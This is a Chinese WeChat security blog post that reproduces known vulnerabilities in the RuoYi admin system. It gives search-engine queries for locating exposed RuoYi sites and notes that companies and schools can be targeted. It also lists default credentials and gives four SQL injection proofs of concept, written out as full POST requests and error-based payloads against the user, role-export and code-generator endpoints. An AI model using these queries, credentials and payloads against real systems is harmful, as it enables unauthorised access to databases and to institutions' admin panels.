---
title: edu漏洞之若依nday漏洞复现(一)
url: https://mp.weixin.qq.com/s/CZmoztuvC2mYssA2VVtWgg
source: Doonsec's feed
date: 2026-04-23
fetch_date: 2026-04-24T04:48:38.780096
---

# edu漏洞之若依nday漏洞复现(一)

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/R9d0DzJpTeKNHKMGNMGYCQy38SnYSkibicuaUqCUVaZ0atHJgxIFkcM0QC66IO84IiaicJISz9wIpFGjqPEZiaZuD0DiaNqZnguvXxdxstlID4CZw/0?wx_fmt=jpeg)

# edu漏洞之若依nday漏洞复现(一)

小轩
小轩

响应云Sec

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

## 响应云Sec

免责声明

```
由于传播、利用本公众号所提供的信息而造成的任何直接或者
间接的后果及损失，均由使用者本人负责，公众号响应云Sec
及作者不为此承担任何责任，一旦造成后果请自行承担！
```

# 0X01前言

想必很多师傅想挖管理系统的漏洞 但不知道有何处下手而烦恼吧！

今天分享的是若依nday漏洞复现，虽然这个系统的漏洞已经是很常见的了，比较出来了很久 老师傅们也都会，刚初来驾到的师傅可以好好看看 也是为了学习思路和技术，在我看来思路是比较重要的 有了思路打洞的流程会变的快很多，好比在一个站点用工具乱扫。 好哒，师傅们做好小板凳出发了！> \_ <

## 若依nday漏洞搜索语法

```
(icon_hash="-1231872293" || icon_hash="706913071") //这个是fofa的icon

web.body="若依后台管理系统" //鹰图的

//师傅们可以自己修改语法 去搜索想要的站点 企业 学校都可以
```

### 若依后台管理系统的特征

1.若依系统最经典的加载界面

![](https://mmbiz.qpic.cn/sz_mmbiz_png/R9d0DzJpTeKzpXCxiacqw0Dp0HibyxaCzZm0GItApuKcz0Mgv96Zm7Bp6wpFvicZJHW6muqjgZxLHorojeTLfDicw9Ch8tMPgL8GWDV2dDfjMkM/640?wx_fmt=png&from=appmsg)

2.blade登录后台网站特征

![](https://mmbiz.qpic.cn/sz_mmbiz_png/R9d0DzJpTeLwYcjGdOLEJ4cIHKiaxmVmBzfx0QRbdt9ib7MMJ6QxicfmYYGLc0VRKJTIxP5ciaIDyft3b6T7PNWibricwUrdM2icvwzFAve2yGekss/640?wx_fmt=png&from=appmsg)

3.icon图标

![](https://mmbiz.qpic.cn/sz_mmbiz_png/R9d0DzJpTeJ1zv7Q42AUA4op0Z0u4wOf9WuNVVoKt4RutibkxbeVG9lS7uziccKciaXcbfTj9siayYGGBgfoEv7nbjGS1KfsCCPk1TBYw7iagsK4/640?wx_fmt=png&from=appmsg)

### 若依nday漏洞一

#### 弱口令：

```
admin ruoyi druid   //账号
123456 admin druid admin123 admin888  //密码
但是常用的是admin:amdin123/ry:admin123
```

![](https://mmbiz.qpic.cn/mmbiz_png/R9d0DzJpTeJsoibmtY5IIqj4qYfX3yqUlzo1g7MsYj5DF7huEhZgDS03GXd0mAo6qiaKcAoTiagVOc2HwaAQZrqhyzEg4DH9z8k8kzNIJ0vJRo/640?wx_fmt=png&from=appmsg)

### 若依nday漏洞二

#### SQL注入：

[所有操作都需要修改登录后的JSESSIONID值]

都是POST请求方式

注入点一 在角色管理页面的请求包

POC:

```
POST /system/user/list HTTP/1.1
Host: xxx
Content-Length: 153
Pragma: no-cache
Cache-Control: no-cache
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
Accept: application/json, text/javascript, /; q=0.01
Content-Type: application/x-www-form-urlencoded
Origin: xxx
Referer: xxx
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=410264c7-c5f3-4699-aba3-6211b8986bea
Connection: keep-alive

pageSize=10&pageNum=1&orderByColumn=createTime&deptId=&parentId=&loginName=&phonenumber=&status=&params%5BbeginTime%5D=&params%5BendTime%5D=&isAsc=desc,0
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/R9d0DzJpTeJibFz9HQqtXgTNDrL3ny1YT9eRvS44ZLGrp1JjuibvM4NEvU3xPB9M1Dibk7C2YDaA3xAcEurjJbicp2EPmJU5ANc7Wuk23pZoibBQ/640?wx_fmt=png&from=appmsg)

注入点二：角色编辑处

```
POST /system/user/edit HTTP/1.1
Host: xxx
Content-Length: 232
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
Accept: application/json, text/javascript, /; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: xxx
Referer: xxx
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=410264c7-c5f3-4699-aba3-6211b8986bea
Connection: keep-alive

userId=2&deptId=105&userName=%E8%8B%A5%E4%BE%9D&dept.deptName=%E6%B5%8B%E8%AF%95%E9%83%A8%E9%97%A8&phonenumber=15666666666&email=ry%40qq.com&loginName=ry&sex=1&role=2&remark=%E6%B5%8B%E8%AF%95%E5%91%98&roleIds=2&postIds=2&status=0,1
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/R9d0DzJpTeJaHEUGeg8h0yEOBhn9Il8t2JPdGkjOaAjSY438Jcs101xFq6nRAjvavSJgFE0ibB05dzdskjibnWzAPeP3icHj96fDb2opRpHXCc/640?wx_fmt=png&from=appmsg)

注入点三：角色导出处

```
POST /system/role/export HTTP/1.1
Host: xxx
Content-Length: 75
sec-ch-ua: "Chromium";v="109", "Not_A Brand";v="99"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: xxx
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: xxx
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: o0At_2132_saltkey=JW6Gt2hb; o0At_2132_lastvisit=1691240426; o0At_2132_ulastactivity=2db4EUfD9WS50eLvnip%2B9TxK2ZhcO65vPL0dA6sPVF8AQSBMa6Qn; JSESSIONID=cfcf2d1f-f180-46cf-98bb-5eacc4206014
Connection: close

params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))
```

![](https://mmbiz.qpic.cn/mmbiz_png/R9d0DzJpTeJ2V9DIHTzm53RN5Fj0uc5ia2ibms6REfOwOIuWRrY8U5w6a5OQoy9uZscV0L79q3w0PAgSW4bvbB96OuiaFekSW1rE3bTAxeySxc/640?wx_fmt=png&from=appmsg)

sql注入四：RuoYi4.7.5版本后台sql注入

```
ruoyi-4.7.5 后台 com/ruoyi/generator/controller/GenController 下/tool/gen/createTable路由存在sql注入。
POC：
sql=CREATE table ss1 as SELECT/**/* FROM sys_job WHERE 1=1 union/**/SELECT/**/extractvalue(1,concat(0x7e,(select/**/version()),0x7e));
```

![](https://mmbiz.qpic.cn/mmbiz_png/R9d0DzJpTeIA9cgSic7uibylvBGfePvv6eHw3gxnteicJibE8p3ia0jAORHAmbEuicL1vucCB3ibZ9fxqwaJFOC4deMp33LZpYUfCdBdwQK4J9BiamU/640?wx_fmt=png&from=appmsg)

```
师傅们今天就到这里 下期我们再见！！！>_< 晚安
```

- END -

预览时标签不可点

修改于

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/R9d0DzJpTeKDOjDBsWa5gSQdQh7QjycaRPIEPDV62WoMOibfcKYic3PZVZcFjZL0ZaW3XTfGNtJGyRSTAm7GeGBQjgibhVtdsck12nhbcHumg4/0?wx_fmt=png)

响应云Sec

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/R9d0DzJpTeKDOjDBsWa5gSQdQh7QjycaRPIEPDV62WoMOibfcKYic3PZVZcFjZL0ZaW3XTfGNtJGyRSTAm7GeGBQjgibhVtdsck12nhbcHumg4/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过